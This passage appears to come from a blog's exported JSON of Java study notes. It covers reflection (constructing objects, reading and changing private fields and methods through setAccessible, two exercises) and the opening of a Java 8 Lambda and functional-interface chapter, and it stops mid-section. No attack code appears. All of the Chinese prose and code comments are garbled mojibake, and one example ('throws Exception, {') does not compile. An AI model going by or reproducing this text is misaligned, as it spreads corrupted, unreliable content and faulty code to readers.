è¯¥å±æ€§çš„ä¿®é¥°ç¬¦å€¼=1 è¯¥å±æ€§çš„ç±»å‹=class java.lang.String\næœ¬ç±»ä¸­æ‰€æœ‰å±æ€§=age è¯¥å±æ€§çš„ä¿®é¥°ç¬¦å€¼=12 è¯¥å±æ€§çš„ç±»å‹=int\næœ¬ç±»ä¸­æ‰€æœ‰å±æ€§=job è¯¥å±æ€§çš„ä¿®é¥°ç¬¦å€¼=0 è¯¥å±æ€§çš„ç±»å‹=class java.lang.String\næœ¬ç±»ä¸­æ‰€æœ‰å±æ€§=sal è¯¥å±æ€§çš„ä¿®é¥°ç¬¦å€¼=2 è¯¥å±æ€§çš„ç±»å‹=double\n==========================\næœ¬ç±»ä¸­æ‰€æœ‰æ–¹æ³•=m1 è¯¥æ–¹æ³•çš„è®¿é—®ä¿®é¥°ç¬¦å€¼=1 è¯¥æ–¹æ³•è¿”å›ç±»å‹void\næœ¬ç±»ä¸­æ‰€æœ‰æ–¹æ³•=m2 è¯¥æ–¹æ³•çš„è®¿é—®ä¿®é¥°ç¬¦å€¼=4 è¯¥æ–¹æ³•è¿”å›ç±»å‹class java.lang.String\næœ¬ç±»ä¸­æ‰€æœ‰æ–¹æ³•=m4 è¯¥æ–¹æ³•çš„è®¿é—®ä¿®é¥°ç¬¦å€¼=2 è¯¥æ–¹æ³•è¿”å›ç±»å‹void\næœ¬ç±»ä¸­æ‰€æœ‰æ–¹æ³•=m3 è¯¥æ–¹æ³•çš„è®¿é—®ä¿®é¥°ç¬¦å€¼=0 è¯¥æ–¹æ³•è¿”å›ç±»å‹void\nè¯¥æ–¹æ³•çš„å½¢å‚ç±»å‹=class java.lang.String\nè¯¥æ–¹æ³•çš„å½¢å‚ç±»å‹=int\nè¯¥æ–¹æ³•çš„å½¢å‚ç±»å‹=double\n==========================\næœ¬ç±»ä¸­æ‰€æœ‰æ„é€ å™¨=com.jwt.reflection.Person\næœ¬ç±»ä¸­æ‰€æœ‰æ„é€ å™¨=com.jwt.reflection.Person\næœ¬ç±»ä¸­æ‰€æœ‰æ„é€ å™¨=com.jwt.reflection.Person\nè¯¥æ„é€ å™¨çš„å½¢å‚ç±»å‹=class java.lang.String\nè¯¥æ„é€ å™¨çš„å½¢å‚ç±»å‹=int\nè¯¥æ„é€ å™¨çš„å½¢å‚ç±»å‹=class java.lang.String\n**/\n\n```\n\n## åå°„åˆ›å»ºå¯¹è±¡\n\n- æ–¹å¼ä¸€ï¼šè°ƒç”¨ç±»ä¸­çš„publicä¿®é¥°çš„æ— å‚æ„é€ å™¨åˆ›å»ºå¯¹è±¡\n- æ–¹å¼äºŒï¼šè°ƒç”¨ç±»ä¸­çš„æŒ‡å®šæ„é€ å™¨åˆ›å»ºå¯¹è±¡\n\nClassç±»ç›¸å…³æ–¹æ³•\n\n- newInstance() è°ƒç”¨ç±»ä¸­çš„æ— å‚æ„é€ å™¨ï¼Œè·å–å¯¹åº”ç±»çš„å¯¹è±¡\n- getConstructor(Class..clazz) æ ¹æ®å‚æ•°åˆ—è¡¨ï¼Œè·å–å¯¹åº”çš„publicæ„é€ å™¨å¯¹è±¡\n- getDecalaredConstructor(Class.cazz) æ ¹æ®å‚æ•°åˆ—è¡¨ï¼Œè·å–å¯¹åº”çš„æ‰€æœ‰æ„é€ å™¨å¯¹è±¡\n\nConstructorç±»ç›¸å…³æ–¹æ³•\n\n- setAccessibleï¼šçˆ†ç ´ï¼ˆå½¢å‚å¡«å…¥trueï¼Œå³å¯è®¿é—®ç§æœ‰æ„é€ æ–¹æ³•ã€å˜é‡ã€æ–¹æ³•ç­‰ï¼‰\n- newInstance(Objectâ€¦obj)ï¼šè°ƒç”¨æ„é€ å™¨\n\n```java\npackage com.jwt.reflection;\n\nimport java.lang.reflect.Constructor;\n\npublic class ReflecCreateInstance {\n    public static void main(String[] args) throws Exception {\n        //1. å…ˆè·å–åˆ°User ç±»çš„Class å¯¹è±¡\n        Class<?> userClass = Class.forName(\"com.jwt.reflection.User\");\n        //2. é€šè¿‡public çš„æ— å‚æ„é€ å™¨åˆ›å»ºå®ä¾‹\n        Object user1 = userClass.newInstance();\n        System.out.println(user1);\n        //3. é€šè¿‡public çš„æœ‰å‚æ„é€ å™¨åˆ›å»ºå®ä¾‹\n        //3.1 å…ˆå¾—åˆ°å¯¹åº”æ„é€ å™¨\n        Constructor<?> constructor = userClass.getConstructor(String.class);\n        //3.2 åˆ›å»ºå®ä¾‹ï¼Œå¹¶ä¼ å…¥å®å‚\n        Object user2 = constructor.newInstance(\"å°ç®€\");\n        System.out.println(user2);\n        //4. é€šè¿‡épublic çš„æœ‰å‚æ„é€ å™¨åˆ›å»ºå®ä¾‹\n        //4.1 å¾—åˆ°private çš„æ„é€ å™¨å¯¹è±¡\n        Constructor<?> constructor1 = userClass.getDeclaredConstructor(int.class, String.class);\n        //4.2 åˆ›å»ºå®ä¾‹\n        //æš´ç ´ã€æš´åŠ›ç ´è§£ã€‘, ä½¿ç”¨åå°„å¯ä»¥è®¿é—®private æ„é€ å™¨/æ–¹æ³•/å±æ€§\n        constructor1.setAccessible(true);\n        Object user3 = constructor1.newInstance(100, \"å¼ ä¸‰ä¸°\");\n        System.out.println(user3);\n    }\n}\n\n\nclass User {\n    private int age = 10;\n    private String name = \"å°æ˜\";\n    public User() {//æ— å‚public\n    }\n    public User(String name) {//public çš„æœ‰å‚æ„é€ å™¨\n        this.name = name;\n    }\n    private User(int age, String name) {//private æœ‰å‚æ„é€ å™¨\n        this.age = age;\n        this.name = name;\n    }\n    @Override\n    public String toString() {\n        return \"User [age=\" + age + \", name=\" + name + \"]\";\n    }\n}\n```\n\n## åå°„è®¿é—®ç±»ä¸­çš„æˆå‘˜\n\n### è®¿é—®å±æ€§\n\n- 1.æ ¹æ®å±æ€§åè·å–Fieldå¯¹è±¡\n  - `Field f = classå¯¹è±¡.getDeclaredField(å±æ€§å);`\n- 2.æš´ç ´\n  - `f.setAccessible(true); //fæ˜¯Field`\n- 3.è®¿é—®\n  - `f.set(o,å€¼);  //oè¡¨ç¤ºå¯¹è±¡`\n  - `f.get(o); //oè¡¨ç¤ºå¯¹è±¡`\n- 4.æ³¨æ„:å¦‚æœæ˜¯é™æ€å±æ€§ï¼Œåˆ™setå’Œgetä¸­çš„å‚æ•°oï¼Œå¯ä»¥å†™æˆnull\n\n```java\npackage com.jwt.reflection;\n\nimport java.lang.reflect.Field;\npublic class ReflecAccessProperty {\n    public static void main(String[] args) throws Exception {\n        //1. å¾—åˆ°Student ç±»å¯¹åº”çš„Class å¯¹è±¡\n        Class<?> stuClass = Class.forName(\"com.jwt.reflection.Student\");\n        //2. åˆ›å»ºå¯¹è±¡\n        Object o = stuClass.newInstance();//o çš„è¿è¡Œç±»å‹å°±æ˜¯Student\n        System.out.println(o.getClass());//Student\n        System.out.println(o);\n        //3. ä½¿ç”¨åå°„å¾—åˆ°age å±æ€§å¯¹è±¡\n        Field age = stuClass.getField(\"age\");\n        System.out.println(age.get(o));//è¿”å›age å±æ€§çš„å€¼\n        age.set(o, 88);//é€šè¿‡åå°„æ¥æ“ä½œå±æ€§\n        System.out.println(o);\n        System.out.println(age.get(o));\n        //4. ä½¿ç”¨åå°„æ“ä½œname å±æ€§\n        Field name = stuClass.getDeclaredField(\"name\");\n        //å¯¹name è¿›è¡Œæš´ç ´, å¯ä»¥æ“ä½œprivate å±æ€§\n        name.setAccessible(true);\n        name.set(o, \"å°æ˜\");\n        System.out.println(name.get(o)); //è·å–å±æ€§å€¼\n        System.out.println(o);\n        \n        name.set(null, \"å°çº¢\");//å› ä¸ºname æ˜¯staticå±æ€§ï¼Œå› æ­¤o ä¹Ÿå¯ä»¥ç”¨null\n        System.out.println(name.get(null));//è·å–å±æ€§å€¼, è¦æ±‚name æ˜¯static\n        System.out.println(o);\n    }\n}\n\nclass Student {//ç±»\n    public int age;\n    private static String name;\n    public Student() {//æ„é€ å™¨\n    }\n    @Override\n    public String toString() {\n        return \"Student [age=\" + age + \", name=\" + name + \"]\";\n    }\n}\n```\n\n### è®¿é—®æ–¹æ³•\n\n- 1.æ ¹æ®æ–¹æ³•åå’Œå‚æ•°åˆ—è¡¨è·å–Methodæ–¹æ³•å¯¹è±¡\n  - `Method m = classå¯¹è±¡.getDeclaredMethod(æ–¹æ³•åï¼ŒXX.class);`\n\n- 2.è·å–å¯¹è±¡: `Object o = classå¯¹è±¡.newlnstance();`\n- 3.æš´ç ´: `m.setAccessible(true);`\n- 4.è®¿é—®: `Object returnValue = m.invoke(o,å®å‚åˆ—è¡¨);`\n- 5.æ³¨æ„:å¦‚æœæ˜¯é™æ€æ–¹æ³•ï¼Œåˆ™invokeçš„å‚æ•°oï¼Œå¯ä»¥å†™æˆnull!\n\n```java\npackage com.jwt.reflection;\n\nimport java.lang.reflect.Method;\n\npublic class ReflecAccessMethod {\n    public static void main(String[] args) throws Exception {\n        //1. å¾—åˆ°Boss ç±»å¯¹åº”çš„Class å¯¹è±¡\n        Class<?> bossCls = Class.forName(\"com.jwt.reflection.Boss\");\n        //2. åˆ›å»ºå¯¹è±¡\n        Object o = bossCls.newInstance();\n        //3. è°ƒç”¨public çš„hi æ–¹æ³•\n        //3.1 å¾—åˆ°hi æ–¹æ³•å¯¹è±¡\n        Method hi = bossCls.getMethod(\"hi\", String.class);//OK\n        //Method hi = bossCls.getDeclaredMethod(\"hi\", String.class);//OK\n        //3.2 è°ƒç”¨\n        hi.invoke(o, \"å°æ˜\");\n        //4. è°ƒç”¨private static æ–¹æ³•\n        //4.1 å¾—åˆ°say æ–¹æ³•å¯¹è±¡\n        Method say = bossCls.getDeclaredMethod(\"say\", int.class, String.class, char.class);\n        //4.2 å› ä¸ºsay æ–¹æ³•æ˜¯private, æ‰€ä»¥éœ€è¦æš´ç ´ï¼ŒåŸç†å’Œå‰é¢è®²çš„æ„é€ å™¨å’Œå±æ€§ä¸€æ ·\n        say.setAccessible(true);\n        System.out.println(say.invoke(o, 100, \"å¼ ä¸‰\", 'ç”·'));\n        //4.3 å› ä¸ºsay æ–¹æ³•æ˜¯static çš„ï¼Œè¿˜å¯ä»¥è¿™æ ·è°ƒç”¨ï¼Œå¯ä»¥ä¼ å…¥null\n        System.out.println(say.invoke(null, 200, \"æå››\", 'å¥³'));\n        //5. åœ¨åå°„ä¸­ï¼Œå¦‚æœæ–¹æ³•æœ‰è¿”å›å€¼ï¼Œç»Ÿä¸€è¿”å›Object , ä½†æ˜¯ä»–è¿è¡Œç±»å‹å’Œæ–¹æ³•å®šä¹‰çš„è¿”å›ç±»å‹ä¸€è‡´\n        Object reVal = say.invoke(null, 300, \"ç‹äº”\", 'ç”·');\n        System.out.println(\"reVal çš„è¿è¡Œç±»å‹=\" + reVal.getClass());//String\n        //åœ¨æ¼”ç¤ºä¸€ä¸ªè¿”å›çš„æ¡ˆä¾‹\n        Method m1 = bossCls.getDeclaredMethod(\"m1\");\n        Object reVal2 = m1.invoke(o);\n        System.out.println(\"reVal2 çš„è¿è¡Œç±»å‹=\" + reVal2.getClass());//Monster\n    }\n}\n\nclass Monster {}\nclass Boss {//ç±»\n    public int age;\n    private static String name;\n\n    public Boss() {//æ„é€ å™¨\n    }\n\n    public Monster m1() {\n        return new Monster();\n    }\n\n    private static String say(int n, String s, char c) {//é™æ€æ–¹æ³•\n        return n + \" \" + s + \" \" + c;\n    }\n\n    public void hi(String s) {//æ™®é€špublic æ–¹æ³•\n        System.out.println(\"hi \" + s);\n    }\n}\n```\n\n## æœ¬ç« ç»ƒä¹ \n\n### ç»ƒä¹ 1 \n\né€šè¿‡åå°„ä¿®æ”¹ç§æœ‰æˆå‘˜å˜é‡\n\n- 1.å®šä¹‰ PrivateTest ç±»ï¼Œ æœ‰ç§æœ‰ name å±æ€§ï¼Œå±æ€§å€¼ä¸º hellokitty\n- 2.æä¾› getName çš„å…¬æœ‰æ–¹æ³•\n- 3.åˆ©ç”¨ Class ç±»å¾—åˆ°ç§æœ‰çš„ name å±æ€§ï¼Œä¿®æ”¹ç§æœ‰çš„ name å±æ€§å€¼ï¼Œå¹¶è°ƒç”¨ getName() çš„æ–¹æ³•æ‰“å° name å±æ€§å€¼\n\n```java\npackage com.jwt.reflection;\n\nimport java.lang.reflect.Field;\nimport java.lang.reflect.InvocationTargetException;\nimport java.lang.reflect.Method;\n\npublic class Homework01 {\n    public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchFieldException, NoSuchMethodException, InvocationTargetException {\n        Class<?> aClass = Class.forName(\"com.jwt.reflection.PrivateTest\");\n        Object o = aClass.newInstance();\n        Field name =  aClass.getDeclaredField(\"name\");\n        name.setAccessible(true);\n        name.set(o,\"å°æ˜\");\n        Method getName = aClass.getMethod(\"getName\");\n        Object returnValue = getName.invoke(o);\n        System.out.println(\"returnValue = \" + returnValue);\n    }\n}\n\nclass PrivateTest{\n    private String name = \"hellokitty\";\n    public String getName() {\n        return name;\n    }\n}\n```\n\n###  ç»ƒä¹ 2\n\nåˆ©ç”¨åå°„å’Œ File å®Œæˆä»¥ä¸‹åŠŸèƒ½\n\n- 1.åˆ©ç”¨ Class ç±»çš„ forName æ–¹æ³•å¾—åˆ° File ç±»çš„ class å¯¹è±¡\n- 2.åœ¨æ§åˆ¶å°æ‰“å° File ç±»çš„æ‰€æœ‰æ„é€ å™¨\n- 3.é€šè¿‡ newInstance çš„æ–¹æ³•åˆ›å»º File å¯¹è±¡ï¼Œ å¹¶åˆ›å»º /Users/jianjian/Downloads/mynew.txt æ–‡ä»¶\n- æç¤º:åˆ›å»ºæ–‡ä»¶çš„æ­£å¸¸å†™æ³•å¦‚ä¸‹:\n  - File file = new File(\"è·¯å¾„\");\n  - file.createNewFile();\n\n```java\npackage com.jwt.reflection;\n\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.InvocationTargetException;\nimport java.lang.reflect.Method;\n\npublic class Homework02 {\n    public static void main(String[] args) throws Exception, {\n        //å¾—åˆ° File ç±»çš„ class å¯¹è±¡\n        Class<?> aClass = Class.forName(\"java.io.File\");\n      \t//æ‰“å° File ç±»çš„æ‰€æœ‰æ„é€ å™¨\n        Constructor<?>[] declaredConstructors = aClass.getDeclaredConstructors();\n        for (Constructor<?> i:declaredConstructors){\n            System.out.println(\"Fileæ„é€ å™¨ = \" + i);\n        }\n        //æŒ‡å®šæ„é€ å™¨åˆ›å»ºFileå¯¹è±¡\n        Constructor<?> dc = aClass.getDeclaredConstructor(String.class);\n        Object fileObj = dc.newInstance(\"/Users/jianjian/Downloads/mynew.txt\");\n        //å¾—åˆ°createNewFileçš„æ–¹æ³•å¯¹è±¡\n        Method createNewFile = aClass.getMethod(\"createNewFile\");\n        createNewFile.invoke(fileObj);\n        System.out.println(\"åˆ›å»ºæˆåŠŸ\");\n    }\n}\n```\n\n## å‚è€ƒ\n\n- [Javaåå°„è¯¦è§£ï¼šå…¥é—¨+ä½¿ç”¨+åŸç†+åº”ç”¨åœºæ™¯](https://www.cnblogs.com/mikechenshare/p/15796381.html)\n- [Javaå®‰å…¨ï½œåå°„çœ‹è¿™ä¸€ç¯‡å°±å¤Ÿäº†](https://www.freebuf.com/articles/web/325541.html)\n\n## Sponsor\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœæ‚¨æ°å·§è´¢åŠ›é›„åšï¼Œåˆæ„Ÿè§‰æœ¬æ–‡å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ï¼Œæ‹’ç»ç™½å«–ï¼Œä»ä½ æˆ‘åšèµ·ï¼ğŸ¥°ğŸ¥°ğŸ¥°\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["åå°„"],"categories":["JavaSE"]},{"title":"Java8-æ–°ç‰¹æ€§","url":"/posts/58320.html","content":"\n## å‰è¨€\n\nå“ˆå–½ï¼å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯å°ç®€ã€‚ä»Šå¤©å¼€å§‹å­¦ä¹ ã€ŠJava8-æ–°ç‰¹æ€§ã€‹ï¼Œæ­¤ç³»åˆ—æ˜¯æˆ‘åšçš„ä¸€ä¸ª â€œJava ä» 0 åˆ° 1 â€ å®éªŒï¼Œç»™è‡ªå·±ä¸€å¹´å·¦å³æ—¶é—´ï¼ŒæŒ‰ç…§æˆ‘è‡ªå·±æ€»ç»“çš„ [Java-å­¦ä¹ è·¯çº¿](https://jwt1399.top/posts/29829.html)ï¼Œä» 0 å¼€å§‹å­¦ Java çŸ¥è¯†ï¼Œå¹¶ä¸å®šæœŸæ›´æ–°æ‰€å­¦ç¬”è®°ï¼ŒæœŸå¾…ä¸€å¹´åçš„èœ•å˜å§ï¼<æœ‰åŒæ ·æƒ³æ³•çš„å°ä¼™ä¼´ï¼Œå¯ä»¥è”ç³»æˆ‘ä¸€èµ·äº¤æµå­¦ä¹ å“¦ï¼>\n\n- [x] ğŸš©æ—¶é—´å®‰æ’ï¼šé¢„è®¡3å¤©æ›´æ–°å®Œ\n- [x] ğŸ¯å¼€å§‹æ—¶é—´ï¼š04-03\n- [x] ğŸ‰ç»“æŸæ—¶é—´ï¼š04-05\n- [x] ğŸ€æ€»ç»“ï¼šæŒ‰æ—¶å®Œæˆï¼\n\n## Lambdaè¡¨è¾¾å¼\n\n### Lambda\n\nè¯»ä½œ`Î»`è¡¨è¾¾å¼ï¼Œå®ƒå…¶å®å°±æ˜¯æˆ‘ä»¬æ¥å£åŒ¿åå®ç°çš„ç®€åŒ–ï¼ŒLambda æ˜¯ä¸€ä¸ªåŒ¿åå‡½æ•°ï¼ŒLambda å…è®¸æŠŠå‡½æ•°ä½œä¸ºä¸€ä¸ªæ–¹æ³•çš„å‚æ•°ï¼ˆå‡½æ•°ä½œä¸ºå‚æ•°ä¼ é€’è¿›æ–¹æ³•ä¸­ï¼‰\n\nLambda è¡¨è¾¾å¼çš„åŸºç¡€è¯­æ³•ï¼šJava8 ä¸­å¼•å…¥äº†ä¸€ä¸ªæ–°çš„æ“ä½œç¬¦ \"`->`\" è¯¥æ“ä½œç¬¦ç§°ä¸ºç®­å¤´æ“ä½œç¬¦æˆ– Lambda æ“ä½œç¬¦\n\nç®­å¤´æ“ä½œç¬¦å°† Lambda è¡¨è¾¾å¼æ‹†åˆ†æˆä¸¤éƒ¨åˆ†ï¼š\n\n- å·¦ä¾§ï¼šLambda è¡¨è¾¾å¼çš„å‚æ•°åˆ—è¡¨\n\n- å³ä¾§ï¼šLambda è¡¨è¾¾å¼ä¸­æ‰€éœ€æ‰§è¡Œçš„åŠŸèƒ½ï¼Œ å³ Lambda ä½“\n\n```java\nè¯­æ³•æ ¼å¼ä¸€ï¼šæ— å‚æ•°ï¼Œæ— è¿”å›å€¼\n() -> System.out.println(\"Hello Lambda!\");\n\nè¯­æ³•æ ¼å¼äºŒï¼šæœ‰ä¸€ä¸ªå‚æ•°ï¼Œå¹¶ä¸”æ— è¿”å›å€¼\n(String x) -> System.out.println(x)\n  \nè¯­æ³•æ ¼å¼ä¸‰ï¼šæ•°æ®ç±»å‹å¯ä»¥çœç•¥ï¼Œå› ä¸ºå¯ç”±ç¼–è¯‘å™¨æ¨æ–­å¾—å‡ºï¼Œç§°ä¸ºâ€œç±»å‹æ¨æ–­â€\n(x) -> System.out.println(x)\n\nè¯­æ³•æ ¼å¼å››ï¼šè‹¥åªæœ‰ä¸€ä¸ªå‚æ•°ï¼Œå°æ‹¬å·å¯ä»¥çœç•¥ä¸å†™\nx -> System.out.println(x)\n\nè¯­æ³•æ ¼å¼äº”ï¼šæœ‰ä¸¤ä¸ªä»¥ä¸Šçš„å‚æ•°ï¼Œæœ‰è¿”å›å€¼ï¼Œå¹¶ä¸” Lambda ä½“ä¸­æœ‰å¤šæ¡è¯­å¥\nComparator<Integer> com = (x, y) -> {\n  System.out.println(\"å‡½æ•°å¼æ¥å£\");\n  return Integer.compare(x, y);\n};\n\nè¯­æ³•æ ¼å¼å…­ï¼šè‹¥ Lambda ä½“ä¸­åªæœ‰ä¸€æ¡è¯­å¥ï¼Œ return å’Œå¤§æ‹¬å·éƒ½å¯ä»¥çœç•¥ä¸å†™\nComparator<Integer> com = (x, y) -> Integer.compare(x, y);\n```\n\n**ä»åŒ¿åç±»åˆ° Lambda çš„è½¬æ¢**\n\n```java\n@Test\npublic void test(){\n  //åŒ¿åå†…éƒ¨ç±»\n  Runnable r1 = new Runnable() {\n    @Override\n    public void run() {\n      System.out.println(\"Hello World!\");\n    }\n  };\n  r1.run();\n  \n  //Lambda è¡¨è¾¾å¼\n  Runnable r2 = () -> System.out.println(\"He1lo Lambda!\");\n  r2.run();\n}\n```\n\n**å‚æ•°ä¼ é€’**\n\n```java\n@Test\npublic void test2(){\n  //åŸæ¥ä½¿ç”¨åŒ¿åå†…éƒ¨ç±»ä½œä¸ºå‚æ•°ä¼ é€’\n  TreeSet<String> ts = new TreeSet<>(new Comparator<String>(){\n    @Override\n    public int compare(String x, String y) {\n      return Integer.compare(x.length(), y.length());\n    }\n  });\n\n  // Lambdaè¡¨è¾¾å¼ä½œä¸ºå‚æ•°ä¼ é€’\n  Comparator<String> com = (x, y) -> Integer.compare(x.length(), y.length());\n  TreeSet<String> ts2 = new TreeSet<>(com);\n}\n```\n\n### å‡½æ•°å¼æ¥å£\n\n- Lambda è¡¨è¾¾å¼çš„æœ¬è´¨ï¼šä½œä¸ºå‡½æ•°å¼æ¥å£çš„å®ä¾‹\n- åªåŒ…å«ä¸€ä¸ªæŠ½è±¡æ–¹æ³•çš„æ¥å£ï¼Œç§°ä¸ºå‡½æ•°å¼æ¥å£\n- å‡½æ•°å¼æ¥å£å¯ä»¥è¢«éšå¼è½¬æ¢ä¸º Lambda è¡¨è¾¾å¼\n- æˆ‘ä»¬å¯ä»¥åœ¨ä»»æ„å‡½æ•°å¼æ¥å£ä¸Šä½¿ç”¨ @FunctionalInterface æ³¨è§£ï¼Œè¿™æ ·åšå¯ä»¥æ£€æŸ¥å®ƒæ˜¯å¦æ˜¯ä¸€ä¸ªå‡½æ•°å¼æ¥å£ï¼ŒåŒæ—¶javadoc ä¹Ÿä¼šåŒ…å«ä¸€æ¡å£°æ˜ï¼Œè¯´æ˜è¿™ä¸ªæ¥å£æ˜¯ä¸€ä¸ªå‡½æ•°å¼æ¥å£ã€‚\n\nè‡ªå®šä¹‰ä¸€ä¸ªå‡½æ•°å¼æ¥å£\n\n```java\n@FunctionalInterface\ninterface GreetingService \n{\n    void sayMessage(String message);\n}\n```\n\nä½¿ç”¨ Lambda è¡¨è¾¾å¼æ¥è¡¨ç¤ºè¯¥æ¥å£çš„ä¸€ä¸ªå®ç°(JAVA 8 ä¹‹å‰ä¸€èˆ¬æ˜¯ç”¨åŒ¿åç±»å®ç°çš„)ï¼š\n\n```java\nGreetingService greetService1 = message -> System.out.println(\"Hello \" + message);\n```\n\n**Java**å†…ç½®å››å¤§æ ¸å¿ƒå‡½æ•°å¼æ¥å£\n\n| å‡½æ•°å¼æ¥å£               | å‚æ•°ç±»å‹ | è¿”å›ç±»å‹ | ç”¨é€”                                                         |\n| ------------------------ | -------- | -------- | ------------------------------------------------------------ |\n| Consumer\\<T> æ¶ˆè´¹å‹æ¥å£  | T        | void     | å¯¹ç±»å‹ä¸ºTçš„å¯¹è±¡åº”ç”¨æ“ä½œï¼ŒåŒ…å«æ–¹æ³•ï¼švoid accept(T t)          |\n| Supplier\\<T> ä¾›ç»™å‹æ¥å£  | æ—        | T        | è¿”å›ç±»å‹ä¸ºTçš„å¯¹è±¡ï¼ŒåŒ…å«æ–¹æ³•ï¼šT get();                        |\n| Function<T,R> å‡½æ•°å‹æ¥å£ | T        | R        | å¯¹ç±»å‹ä¸ºTçš„å¯¹è±¡åº”ç”¨æ“ä½œï¼Œå¹¶è¿”å›ç»“æœã€‚ç»“æœæ˜¯Rç±»å‹çš„å¯¹è±¡ã€‚åŒ…å«æ–¹æ³•ï¼šR apply(T t); |\n| Predicate\\<T> æ–­å®šå‹æ¥å£ | T        | boolean  | ç¡®å®šç±»å‹ä¸ºTçš„å¯¹è±¡æ˜¯å¦æ»¡è¶³æŸçº¦æŸï¼Œå¹¶è¿”å›booleanå€¼ã€‚åŒ…å«æ–¹æ³•ï¼šboolean test(T t); |\n\nå…¶ä»–å‡½æ•°å¼æ¥å£\n\n| å‡½æ•°å¼æ¥å£                                                   | å‚æ•°ç±»å‹        | è¿”å›ç±»å‹        | ç”¨é€”                                                         |\n| ------------------------------------------------------------ | --------------- | --------------- | ------------------------------------------------------------ |\n| **BiFunction<T,U,R>**                                        | T, U            | R               | å¯¹ç±»å‹ä¸ºT,Uå‚æ•°åº”ç”¨æ“ä½œï¼Œè¿”å›Rç±»å‹çš„ç»“æœã€‚åŒ…å«æ–¹æ³•ä¸ºï¼šRapply(T t,U u); |\n| **UnaryOperator\\<T>** (Functionå­æ¥å£)                       | T               | T               | å¯¹ç±»å‹ä¸ºTçš„å¯¹è±¡è¿›è¡Œä¸€å…ƒè¿ç®—ï¼Œå¹¶è¿”å›Tç±»å‹çš„ç»“æœã€‚åŒ…å«æ–¹æ³•ä¸ºï¼šT apply(T t); |\n| **BinaryOperator\\<T>**(BiFunctionå­æ¥å£)                     | T, T            | T               | å¯¹ç±»å‹ä¸ºTçš„å¯¹è±¡è¿›è¡ŒäºŒå…ƒè¿ç®—ï¼Œå¹¶è¿”å›Tç±»å‹çš„ç»“æœã€‚åŒ…å«æ–¹æ³•ä¸ºï¼šT apply(T t1,T t2); |\n| **BiConsumer<T,U>**                                          | T, U            | void            | å¯¹ç±»å‹ä¸ºT,Uå‚æ•°åº”ç”¨æ“ä½œã€‚ åŒ…å«æ–¹æ³•ä¸ºï¼švoid accept(T t,U u)   |\n| **BiPredicate<T,U>**                                         | T,U             | boolean         | åŒ…å«æ–¹æ³•ä¸ºï¼šboolean test(T t,U u)                            |\n| **ToIntFunction\\<T>** **ToLongFunction\\<T>** **ToDoubleFunction\\<T>** | T               | int long double | åˆ†åˆ«è®¡ç®—intã€longã€doubleå€¼çš„å‡½æ•°                            |\n| **IntFunction\\<R>** **LongFunction\\<R>** **DoubleFunction\\<R>** | int long double | R               | å‚æ•°åˆ†åˆ«ä¸ºintã€longã€doubleç±»å‹çš„å‡½æ•°                        |\n\n### æ–¹æ³•å¼•ç”¨\n\n- æ–¹æ³•å¼•ç”¨æœ¬è´¨ä¸Šå°±æ˜¯ Lambda è¡¨è¾¾å¼\n\n- å½“è¦ä¼ é€’ç»™ Lambda ä½“çš„æ“ä½œï¼Œå·²ç»æœ‰å®ç°çš„æ–¹æ³•äº†ï¼Œå¯ä»¥ä½¿ç”¨æ–¹æ³•å¼•ç”¨ ï¼\n- è¦æ±‚ï¼šå®ç°æ¥å£çš„æŠ½è±¡æ–¹æ³•çš„å‚æ•°åˆ—è¡¨å’Œè¿”å›å€¼ç±»å‹ï¼Œå¿…é¡»ä¸æ–¹æ³•å¼•ç”¨çš„æ–¹æ³•çš„å‚æ•°åˆ—è¡¨å’Œè¿”å›å€¼ç±»å‹ä¿æŒä¸€è‡´ï¼\n- æ ¼å¼ï¼šä½¿ç”¨æ“ä½œç¬¦â€œ`::`â€å°†æ–¹æ³•åå’Œå¯¹è±¡æˆ–ç±»çš„åå­—åˆ†éš”å¼€æ¥ã€‚\n\nå¦‚ä¸‹ä¸‰ç§ä¸»è¦ä½¿ç”¨æƒ…å†µï¼š\n\n- å¯¹è±¡::å®ä¾‹æ–¹æ³•\n\n- ç±»::é™æ€æ–¹æ³•\n\n- ç±»::å®ä¾‹æ–¹æ³•\n\n```java\nConsumer<String> con = (x) -> System.out.println(x);\n//ç­‰åŒäº\nConsumer<String> con = System.out::println;\n\n\n//å¯¹è±¡çš„å¼•ç”¨::å®ä¾‹æ–¹æ³•å\nEmployee emp = new Employee(101, \"å¼ ä¸‰\", 18, 9999.99);\nSupplier<String> sup = () -> emp.getName();\nSystem.out.println(sup.get());\n//ç­‰åŒäº\nSupplier<String> sup2 = emp::getName;\nSystem.out.println(sup2.get());\n\n\n//ç±»å :: é™æ€æ–¹æ³•å\nComparator<Integer> com = (x,y) -> Integer.compare(x,y);\n//ç­‰åŒäº:\nComparator<Integer> com = Integer::compare;\n\n//ç±»å :: å®ä¾‹æ–¹æ³•å\nBiPredicate<String, String> bp = (x,y) -> x.equals(y);\n//ç­‰åŒäº:\nBiPredicate< String,String> bp = String::equals;\n\n//æ³¨æ„:å½“å‡½æ•°å¼æ¥å£æ–¹æ³•çš„ç¬¬-ä¸€ä¸ªå‚æ•°æ˜¯éœ€è¦å¼•ç”¨æ–¹æ³•çš„è°ƒç”¨è€…ï¼Œå¹¶ä¸”ç¬¬äºŒä¸ªå‚æ•°æ˜¯éœ€è¦å¼•ç”¨æ–¹æ³•çš„å‚æ•°(æˆ–æ— å‚æ•°)æ—¶: ClassName::methodName\n```\n\n### æ„é€ å™¨å¼•ç”¨\n\n- 